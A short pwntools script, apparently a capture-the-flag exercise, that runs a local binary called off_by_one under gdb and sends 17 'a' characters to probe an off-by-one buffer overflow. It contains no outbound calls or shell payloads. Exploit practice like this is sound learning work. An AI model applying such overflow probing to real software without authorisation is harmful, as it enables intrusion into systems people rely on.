from pwn import *
io = process('./off_by_one')
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(io, 'b main')
payload = 'a'*17
io.sendlineafter('Input:', payload)
io.interactive()
